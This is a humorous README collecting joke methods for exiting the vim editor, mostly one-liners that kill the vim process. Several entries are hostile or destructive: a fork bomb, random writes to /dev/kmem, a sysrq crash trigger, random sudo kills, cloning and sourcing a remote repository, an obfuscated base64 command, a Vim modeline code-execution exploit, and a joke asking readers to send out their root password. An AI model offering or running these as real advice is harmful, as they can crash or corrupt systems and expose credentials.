# How to exit vim
Below are some simple methods for exiting vim.

For real vim (and hacking) tips, follow [hakluke](https://twitter.com/hakluke) and [tomnomnom](https://twitter.com/tomnomnom) on twitter.

## The simple way
Credit: @tomnomnom

```vim
:!ps axuw | grep vim | grep -v grep | awk '{print $2}' | xargs kill -9
```
### Video tutorial:
[![tomnomnom](http://img.youtube.com/vi/xteTjU8GNMc/0.jpg)](http://www.youtube.com/watch?v=xteTjU8GNMc "tomnomnom")

## The ps-less way
Credit: @tomnomnom

```vim
:!kill -9 $(find /proc -name "cmdline" 2>/dev/null | while read procfile; do if grep -Pa '^vim\x00' "$procfile" &>/dev/null; then echo $procfile; fi; done | awk -F'/' '{print $3}' | sort -u)
```


## The ps-less way using status files
Credit: @hakluke

```vim
:!find /proc -name status | while read file; do echo "$file: "; cat $file | grep vim; done | grep -B1 vim | grep -v Name | while read line; do sed 's/^\/proc\///g' | sed 's/\/.*//g'; done | xargs kill -9
```

## The ps-less process tree way
Credit: @kpumuk

```vim
:!grep -P "PPid:\t(\d+)" /proc/$$/status | cut -f2 | xargs kill -9
```
## The SUS-pend way
Credit: @noobibek
```bash
Ctrl+Z
```

## The first contact way
Credit: @caseyjohnellis
![Jeffrey Way](assets/first-contact-way.png)

## The lazy pythonic using shell way
Credit: @PozziSan

```bash
python -c "from os import system; system('killall -9 vim')"
````

## The pythonic way
Credit: @hakluke

```python
:py3 import os,signal;from subprocess import check_output;os.kill(int(check_output(["pidof","vim"]).decode
('utf-8')),signal.SIGTERM)
```

## The pure perl way
```perl
:!perl -e 'while(</proc/*>){open($f, "$_/cmdline"); kill 9, substr($_,6) if <$f> =~ m|^vim\x00| }'  
```

## The Rustacean's way
Credit: @wodny

1. Reimplement vim in Rust.
2. Call the project `rim`.
3. Run `rim`.
4. Exit `rim` using a borrowed command, ie. `:q!`.

## The lazy rubist using shell way
Credit: @rynaro

```bash
$ ruby -e 'system("killall -9 vim")'
```

## The rubist way
Credit: @rynaro

```bash
$ ruby -e 'pid = `pidof vim`; Process.kill(9, pid.to_i)'
```

## The Colon-less way
Credit: @w181496

In insert mode:
```
<C-R>=system("ps axuw | grep vim | grep -v grep | awk '{print $2}' | xargs kill -9")
```

## The remote way
Credit: @eur0pa

In `vi`:
```vim
:%!( key="kill-vi-$RANDOM"; nc -l 8888 | if grep $key; then pgrep '^vi$' | xargs kill; fi; ) &
```

Remotely:
```bash
$ while true; do curl http://vi-host:8888/kill-vi-$RANDOM; done
```
`vi` will eventually exit


Locally (the cheaty, lazy way, why even bother):
```bash
$ curl "http://localhost:8888/$(ps aux | grep -E -o 'kill-vi-[0-9]+')"
```

## The hardware way
Credit: @Jorengarenar

_**Pull the plug out**_


## The hardware expert way
Use VIMKiller! The most practical physical solution to all your VIM troubles. It only costs 500,000 USD!

[VIMKiller git](https://github.com/caseykneale/VIMKiller)

## The timeout way

Credit: @aarongorka

Before running vim, make sure to set a timeout:
```bash
$ timeout 600 vim
```
Never forget to set a timeout again:
```bash
$ alias vim='timeout 600 vim'
```
Make sure to save regularly.

## The Russian Roulette timeout way

When you want to spice things up a bit:
```bash
$ timeout $RANDOM vim
```

## The Shoot First, Ask Questions Later way
Credit: @aliva
 
```
$ ps axuw | awk '{print $2}' | grep -v PID | shuf -n 1 | sudo kill -9


## The "all against the odds" Russian Roulette way
Credit: @cfrost

When you want to spice things up a bit more:
```
:!ps axuw | sort -R | head -1 | awk '{print $2}' | xargs kill -9
```

## The physics way
Credit: @eyemyth

Accumulate a sufficient amount of entropy.


## The reboot way
Credit: @tctovsli
In `vi`:
```vim
:!sudo reboot
```

## The using vim against itself way (executing the buffer)
Open Vim to empty buffer and type:
```vim
i:qa!<esc>Y:@"<cr>
```

## The AppleScript way
Credit: @dbalatero
In Mac terminal `vi`:

Replace "iTerm" with your terminal application of choice:

```applescript
:let script="activate application \"iTerm\"\ntell application \"System Events\"\n  keystroke \":\"\n  keystroke \"q\"\n  keystroke \"a\"\n  keystroke \"!\"\n  key code 36\nend tell" | call writefile(split(script, "\n", 1), '/tmp/exit-vim.scpt', 'b') | !osascript /tmp/exit-vim.scpt
```

## The Mac Activity Monitor way
Credit: @dbalatero

```applescript
let script="activate application \"Activity Monitor\"\ntell application \"System Events\"\n\tkeystroke \"f\" using {option down, command down}\n\tkeystroke \"vim\"\n\n\ttell process \"Activity Monitor\"\n\t\ttell outline 1 of scroll area 1 of window 1\n\t\t\tselect row 1\n\n\t\t\tkeystroke \"q\" using {option down, command down}\n\t\t\tkey code 36\n\t\tend tell\n\tend tell\nend tell\n" | call writefile(split(script, "\n", 1), '/tmp/exit-vim.scpt', 'b') | !osascript /tmp/exit-vim.scpt
```

## The MacBook Pro Touch Bar way
Credit: @IA_Baby46

Touch `quit vim` text in your touch bar

## The Mac Terminal way

Press <kbd>⌘</kbd>+<kbd>q</kbd> > Click `Terminate`


## The Passive Way

_**Walk away.**_

## The Passive-Aggressive Way

```bash
!bash -c "💣(){ 💣|💣& };💣"
```

*...then walk away.* (n.b. That's a [fork bomb](https://en.wikipedia.org/wiki/Fork_bomb#Bash), please don't try at home.)

## The Microsoft Way
Credit: @cheezmeister

```cmd
!powershell.exe /c "get-process gvim | stop-process"
```

## The C way
Credit: @dbalatero

```c
:let script=['#define _POSIX_SOURCE', '#include <signal.h>', '', "int main() {", "  kill(" . getpid() . ", SIGKILL);", '  return 0;', '}'] | call writefile(script, '/tmp/exit_vim.c', 'b') | execute "!gcc /tmp/exit_vim.c -o /tmp/exit_vim" | execute "! /tmp/exit_vim"
```

## The Emacs way
Credit: @dbalatero

```vim
:let command='emacs --batch --eval=''(shell-command "kill -9 ' . getpid() . '")'' --kill' | execute "!" . command
```

## The Vim way
Credit: @david50407

```vim
:let command='vim ''+\\!kill -9 ' . getpid() . ''' +qall -es' | execute "!" . command
```

## The Client-Server way
Credit: @tartansandal

If `+clientserver` is enabled -- typically the case for the GUI -- you can simply

```vim
:!gvim --remote-send ':q\!<CR>'
```

## The Yolo Way
Credit: @ryanc

Don't run this, it could break your computer.

```bash
:!echo b | sudo tee -a /proc/sysrq-trigger
```

## The layered Method 
Credit: @mashuptwice
```
:!python -c "import os ; os.system(\"ssh localhost kill -9 $(pgrep vim >tmpfile && grep -P '\d+' tmpfile | sed 's/\(.*\)/\1/g' | cat && rm tmpfile) \")"
```
Bonus: still stuck if multiple vim instances are running

## The epileptic Method
Credit: @mashuptwice
```
:!timeout 10 yes "Preparing to exit vim. It might seem that this takes an unreasonable ammount of time and processing power, but instead of complaining you could just enjoy the show\!" | lolcat ; pgrep vim | xargs kill -9
```
May the magnificent colors help you to forget the emotional damage caused by exiting vim!

## The Abstinence Method
Credit: @ryanc

```bash
$ alias vim=/bin/true
```

## The Passive-Aggressive Abstinence Method
Credit: @donkoch

```bash
$ alias vim=/bin/false
```

## The shortest way
Credit: @MasterDevX

```vim
:!x=$(echo "c"); x=$x$(echo "G"); x=$x$(echo "t"); x=$x$(echo "p"); x=$x$(echo "b"); x=$x$(echo "G"); x=$x$(echo "w"); x=$x$(echo "g"); x=$x$(echo "L"); x=$x$(echo "V"); x=$x$(echo "N"); x=$x$(echo "U"); x=$x$(echo "T"); x=$x$(echo "1"); x=$x$(echo "A"); x=$x$(echo "g"); x=$x$(echo "d"); x=$x$(echo "m"); x=$x$(echo "l"); x=$x$(echo "t"); x=$x$(echo "C"); x=$x$(echo "g"); x=$x$(echo "="); x=$x$(echo "="); $(echo $x | base64 --decode)
```

## The suspend way
Credit: @theBenRaskin

```bash
^Z ps axuw | grep vim | grep -v grep | awk '{print $2}' | xargs kill -9
```

## The Minimal, Open-Source way
Credit: @Jbwasse2

NOTE: ONLY RUN THIS IF YOU REALLY, REALLY TRUST @Jbwasse2 TO RUN CODE ON YOUR COMPUTER
```vim
:silent !git clone https://github.com/Jbwasse2/exit_vim_script.git ^@ source exit_vim_script/exit_vim
```

## The Acceptance Way
Credit: @praveenscience

Just stay in Vim 😊 🤘🏻

## The Webmaster Way
Credit: @dosisod

```php
:!echo "<?php if (isset(\$_POST[\"x\"])) {exec(\"killall -s 15 vim\");exec(\"killall -9 vim;reset\");echo(\"<span id='x'>Done\!</span>\");}else {echo(\"<form action='\#' method='post'><button type='submit' name='x' id='x'>Click here to exit vim</button></form>\");}echo(\"<style>html,body{width:100\%,height:100\%}\#x{font-family:monospace;position:fixed;top:50\%;left:50\%;transform:translate(-50\%,-50\%);background:\#7adaff;border:none;font-size:4em;transition:background 500ms ease-out;border-radius: 500px;color:black;padding:15px;}\#x:hover{background:\#7eff7a;}</style>\");?>">index.php;php -S 0.0.0.0:1234&disown;firefox --new-window 0.0.0.0:1234&disown
```

## The Docker way
Credit: @tartansandal

If you run Vim in a docker container like:

```bash
docker run --name my-vim -v `pwd`:/root thinca/vim
```

then you would normally exit vim by stopping the associated container:

```bash
docker stop my-vim
```

## The Kernel way
Credit: @idoasher

run vim as root and run this when you want to exit:

```c
:!printf "\#include <linux/init.h>\n\#include <linux/module.h>\n\#include <linux/sched/signal.h>\n\#include <linux/string.h>\nMODULE_LICENSE(\"GPL\");int  __init i(void){struct task_struct* p;for_each_process(p){if (strcmp(p->comm, \"vim\") == 0){printk(KERN_ALERT \"found a vim \%\%d\\\n\", p->pid);send_sig(SIGKILL, p, 0);}}return 0;}void e(void){return;}module_init(i);module_exit(e);" > k.c; printf "ifneq (\$(KERNELRELEASE),)\n\tobj-m   := k.o\nelse\n\tKERNELDIR ?= /lib/modules/\$(shell uname -r)/build\n\tPWD       := \$(shell pwd)\nmodules:\n\techo \$(MAKE) -C \$(KERNELDIR) M=\$(PWD) LDDINC=\$(PWD)/../include modules\n\t\$(MAKE) -C \$(KERNELDIR) M=\$(PWD) LDDINC=\$(PWD)/../include modules\nendif\n\nclean:  \n\trm -rf *.o *~ core .depend *.mod.o .*.cmd *.ko *.mod.c \\\\\n\t.tmp_versions *.markers *.symvers modules.order\n\ndepend .depend dep:\n\t\$(CC) \$(CFLAGS) -M *.c > .depend\n\nifeq (.depend,\$(wildcard .depend))\n\tinclude .depend\nendif" >Makefile; make; insmod k.ko; rmmod k.ko; make clean; rm k.c Makefile

```

## The even more Extreme Kernel Way
Credit: @penelopezone

**Warning, this may break your entire computer**

```
:!sudo dd if=/dev/urandom of=/dev/kmem
```


## The Android way
Credit: @deletescape

Close the Termux app.

## The extreme Android way
Credit: @deletescape

Run vim inside Termux and run this when you want to exit:

```bash
:!su -c killall zygote
```

## The JavaScript way

```js
const ps = require('ps-node');

ps.lookup({ command: 'vim' }, function(error, resultList) {
  resultList.forEach(function(process) {
    if (process) {
      ps.kill(process.pid);
    }
  });
});
```

## The Kubernetes way
Credit: @Evalle

If you run Vim in Kubernetes pod like:

```bash
kubectl run --generator=run-pod/v1 my-vim  --image=thinca/vim
```

then you would normally exit Vim by deleting the associated Kubernetes pod:

```bash
kubectl delete po my-vim
```

## The Vim inside of Vim inside of Vim inside of Vim... inside of Vim way
Credit: @maxattax97

```bash
:while 1 | execute "terminal vim" | call feedkeys("i:terminal vim\<CR>") | endwhile
```

## Let "automatic garbage collector" do it for you
Credit: @artem-nefedov

Much like your favorite programming language, your OS has built-in garbage collector.
It will close stuff for you, so you don't have to.

```bash
^Z
$ disown
```

Now it's not your problem anymore.
Process will close automatically upon next reboot/shutdown.

## The Product Manager way
Credit: @mqchen

1. Create new Jira issue.
2. Set priority to A - Critical.
3. Assign to random team member.

## The Experienced Product Manager way
Credit: @mqchen

1. Create new Jira issue.
2. Set priority to A - Critical, Epic link and Components.
3. Write Given-When-Then acceptance criteria.
4. Schedule estimation workshop meeting.
5. Conduct estimation meeting with Planning Poker cards.
6. Prioritize in next sprint.
7. Assign to random team member.
8. Conduct acceptance test.
9. Review burn down chart together with the team.
10. Schedule retrospective.

## The spiritual way 
  Credit: @Janice-M
1. Take a cleansing bath
2. Weditate
3. Sage your house
4. Place crystals on your laptop
5. Burn your laptop and whole house down
6. Set your slack status to 'away' indefinitely
7. Move to the forest

## The tmux way
Credit: @vcoutasso

Inside a tmux session:

```
Ctrl+B :kill-session
```
alternativelycd

```
Ctrl+B x y
```

Note that ```Ctrl+B``` is the default prefix. For different prefixes, the command must be adjusted accordingly.

## The Mathematician's way

Define yourself outside vim.

## The Intern way
Credit: @johnoct

1. Don't even try to exit on your own
2. Ask Senior right away

## The Mandalorian way

```vim
:let hash=sha256("$$$ this is the way $$$") | exe nr2char(hash[49:51]).hash[-3:-3]."!"
```

## The debugger way
Credit: @serjepatoff

Linux
```
$ gdb `which vim`
(gdb) r <Enter>
Ctrl-Z q <Enter> y <Enter>
```

Mac
```
$ lldb `which vim`
(lldb) r <Enter>
Ctrl-C q <Enter> <Enter>
```

## The libcall way
Credit: @k-takata

### Windows
```vim
:call libcallnr('kernel32.dll', 'ExitProcess', 0)

```

## The Vagrant way
Credit: @85danf

To run vim:
```
mkdir -p /tmp/vim
cd /tmp/vim
vagrant init --minimal hashicorp/bionic64
vagrant ssh
vim
```
To exit vim, open another shell, then:
```
cd /tmp/vim
vagrant halt
```

## The consonant cluster way
Credit: @wchargin

To exit, saving all files, simply incant (in normal mode):

```vim
qqqqqZZ@qq@q
```

## The customer success way
Credit: @85danf

1. Schedule emergency meeting with R&D about 'worrisome trends apparent in recent support tickets metrics'
2. Present ability to exit vim as probable root cause
3. Wait as developers argue and mansplain stuff
4. Schedule follow up meeting for next quarter
5. Not your problem anymore

## The Matrix way
Credit: @85danf

"There is no vim"

## The SEO Manager way
Credit: @mikulabc

```
how to exit vim
vim exit help
vim exit guide
exit him
how exit vim
```

## Linux
```vim
:call libcallnr('libc.so.6', 'exit', 0)
```

## The canonical way
Credit: @ligurio

```vim
:!q
```

## The Scrum manager way

1. Call in a meeting, early in the morning
2. Tell everybody what a good job they are doing.
3. Tell everybody that there is still a lot to do.
4. Tell everybody that "we" can do it.
5. Remind them of the importance of team work.
6. Go through the tickets.
7. Tell the project manager that a ticket for closing Vim is missing.
8. Write a ticket called "As a user I want to exit Vim!" on your own.
8.1. While reminding everybody that this is not the proper process.
9. Discuss new ticket in group.
10. Reword ticket as "As a user I want to be able to open other applications!"
11. Ask who of the team wants to do this.
12. Postpone decision until the next meeting.

## the pure BASH way
Credit @u2mejc

```bash
:!kill -9 $PPID
```

## The Newbie Way
```
git commit
```

???
```
^x ^x ^x ^d ^c afawfuhi WHAT IS GOING ON faffae ^x
```

In Google:
```
"what is default text editor for git?" | "How to exit vim"
```

## the SSH way
Credit @u2mejc

```
~.
```

## Quit as a Service (QaaS)

1. Add the following to `/etc/ssh/sshd_config`: `PermitRootLogin yes`, `PasswordAuthentication yes`
2. Start sshd server
3. Open ssh port (default 22) on your firewall(s) and forward the same port on your router.
4. Send me the following info: Your root password; Your IP address/domain and port of sshd server. I recommend you test that it works before sending.
5. I will kill vim for you!

## The astronomer's way
Credit: @idisposable

```python
from secrets import randbits

def heat_death():
    return False
    
def increase_entropy():
    return randbits(64)

while heat_death()==False:
    increase_entropy();

print('The universe is dead, VIM no longer exists');
```

## The Jeffrey Way

![Jeffrey Way](assets/jeffrey.jpeg)

## The Entry Level Software Engineer way
1. Try CTRL+C
2. Ask a senior engineer
3. Have senior engineer direct you to [how-to-exit-vim](https://github.com/hakluke/how-to-exit-vim)

## The [Obligatory] Emacs Way

```
$ echo 'alias vim=emacs' >> ~/.bashrc
$ source ~/.bashrc
```

Note: does not exit a running instance of Vim, but resolves future issues.

## The AWS Way
1. In AWS EC2, select **Launch Instance**.
2. Launch an EC2 instance with a Linux based AMI.
3. ssh into the newly created EC2 instance
```shell
ssh -i <ec2 keypair pem location> ec2-user@<ec2 instance ip address>
```
4. Launch vim
```shell
vim
```
5. In the AWS EC2, select the newly created EC2 instance and terminate the instance.

## The Matryoshka Way
Credit: @ccw630

```vim
:!$SHELL
```

## The AWS CLI Way
```
!aws --region `ec2-metadata --availability-zone | sed 's/placement: \(.*\).$/\1/'` ec2 stop-instances --instance-ids `wget -q -O - http://169.254.169.254/latest/meta-data/instance-id`
```

## The Arbitrary Code Execution Way

Based on https://www.exploit-db.com/exploits/46973. Works with Vim < 8.1.1365.

1. Create a file (say `quit.txt`) with the following data:
```
echo ':!killall vim||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="' > quit.txt
```
2. Ensure that the modeline option has not been disabled.
```
echo "set modeline" >> .vimrc
```
3. Open `quit.txt`.
```
:e! quit.txt
```

## The Circuit Breaker Way
Credit:@Tomcat-42

1. Leave your computer
2. Find the nearest electrical circuit breaker panel
3. Switch off and on the main breaker
4. Return to your computer
5. Your computer should no longer be running vim

**Note:** This approach prove itself ineffective against notebooks, desktops on a UPS or remote servers.

## The Ansible Way
Credit: @lpmi-13

run vim.yml playbook with the following contents:

```
---
- hosts: vimbox

  vars:
    required_packages:
    - vim

  tasks:
  - name: install python 2
    raw: test -e /usr/bin/python || (apt -y update && apt install -y python-minimal)

  - name: Update APT package cache
    apt:
      update_cache: yes

  - name: Run apt-get upgrade
    apt: upgrade=safe

  - name: Install required packages
    apt: state=installed pkg={{ item }}
    with_items: "{{ required_packages }}"

  - name: Start Vim in the background.
    shell: "(vim >/dev/null 2>&1 &)"
  
  - name: Quit Vim.
    shell: "(pkill vim)"
```

## The Stack Overflow Way
Credit: @cobaltblu27

*Yeah exiting vim is really frustrating sometimes. You should definately try using Neovim. It's fast, has terminal emulator, and also supports plugin that will help you exit vim.*

## The Go Way

Credit: @youshy

1. Make sure that you have Go installed
2. Write a whole application to find and kill vim

```go
package main

import (
	"bytes"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

func TerminateVim(path string, info os.FileInfo, err error) error {
	var proc []int
	if strings.Count(path, "/") == 3 {
		if strings.Contains(path, "/status") {
			pid, err := strconv.Atoi(path[6:strings.LastIndex(path, "/")])
			if err != nil {
				return err
			}
			f, err := ioutil.ReadFile(path)
			if err != nil {
				return err
			}
			name := string(f[6:bytes.IndexByte(f, '\n')])
			if name == "vim" {
				log.Printf("pid %v name %v\n", pid, name)
				proc = append(proc, pid)
			}
			for _, p := range proc {
				proc, err := os.FindProcess(p)
				if err != nil {
					return err
				}
				proc.Kill()
			}
			return nil
		}
	}
	return nil
}

func main() {
	err := filepath.Walk("/proc", TerminateVim)
	if err != nil {
		log.Fatalln(err)
	}
	log.Printf("Killed vim\n")
}
```

3. Run with `go run .` or make executable using `go build -o VimKill`

## The zig stage1 way

Credit: @tauoverpi

```zig
echo "pub fn main() !noreturn { unreachable; }" > vimkill.zig; zig build-exe vimkill.zig
```

This eventually [exhausts memory](https://github.com/ziglang/zig/issues/3461) on the machine which gives the OOM killer a chance to kill vim.
